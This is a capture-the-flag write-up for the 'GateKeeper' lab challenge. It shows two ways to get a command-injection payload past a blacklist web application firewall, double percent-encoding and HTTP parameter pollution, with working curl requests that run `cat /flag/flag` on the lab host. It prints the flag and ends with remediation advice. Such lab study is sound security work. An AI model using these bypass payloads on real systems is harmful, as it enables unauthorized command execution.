# GateKeeper - WAF evasion (two doors) over OS command injection

| | |
|---|---|
| **Challenge** | GateKeeper |
| **Category** | INJ (waf) |
| **Points / Difficulty** | 200 / hard |
| **Target** | http://inj14.chal.deti:8053 |
| **Bug** | CWE-78 - command injection; blacklist WAF bypassed two independent ways |

## Hint
> The gate checks what it sees, the app reads what it wants; two readers, one request.

## Recon
`GET /run?cmd=...` runs the command; a WAF (blacklist mode) inspects `cmd` first.
- `cmd=ls` → **200** (baseline).
- `cmd=ls;cat /flag/flag` → **403** (the control - naive splitter blocked).
  (A bare `;…` is a shell syntax error, so the payload starts with a real command.)

## Approach - two separate bypasses
The WAF and the app disagree about *which bytes count*:

**Door (a) - decode-depth mismatch.** The WAF percent-decodes once; the app
decodes twice. Double-encode the metacharacters so the WAF sees a harmless
literal and the app reconstructs the shell syntax:
```
;  -> %3B -> %253B      (space -> %20 -> %2520)
GET /run?cmd=ls%253Bcat%2520/flag/flag
```
WAF sees `ls%3Bcat%20/flag/flag` (no `;`, allowed); app's 2nd decode yields
`ls;cat /flag/flag`.

**Door (b) - HTTP parameter pollution.** Two `cmd` params; the WAF inspects one
occurrence, the app runs the other:
```
GET /run?cmd=ls&cmd=ls;cat /flag/flag
```
WAF clears on the benign `ls`; the app executes the occurrence carrying the `;`.

## Exploitation
```bash
curl -s -o /dev/null -w '%{http_code}\n' "http://inj14.chal.deti:8053/run?cmd=ls;cat%20/flag/flag"   # 403 control
# (a) double-encode
curl -s "http://inj14.chal.deti:8053/run?cmd=ls%253Bcat%2520/flag/flag" | grep -oE 'flag\{[^}]*\}'
# (b) HPP
curl -s "http://inj14.chal.deti:8053/run?cmd=ls&cmd=ls;cat%20/flag/flag" | grep -oE 'flag\{[^}]*\}'
```

## Flag
```
flag{b7e779221d9e731d10d19e40a1a3847a}
```

## For the report
- **403 control:** `cmd=ls;cat /flag/flag` → 403 proves the WAF blocks the naive
  path.
- **Two doors (different bugs):**
  - (a) **encoding depth** - WAF decodes once, app twice; double-encoding slips
    the splitter past the gate.
  - (b) **parameter multiplicity** - WAF and app pick different `cmd` occurrences
    from the same request.
- **Fix (as an app-contract change, not "better WAF rules"):** the real contract
  is "run one of a known set of diagnostics" → **allowlist** that set, pass the
  command as an **argument list (no shell)**, and use **one canonical decode**
  shared by WAF and app (reject duplicate params / over-encoded input). A WAF may
  still sit in front, but it is defense-in-depth, not the control.

## Root cause & remediation
- **Cause:** a blacklist applied to one *view* of the request fails whenever
  attacker and defender disagree on the canonical bytes (CWE-78 behind the WAF).
- **Fix:** allowlist + argv + shared canonicalization as above; least privilege.
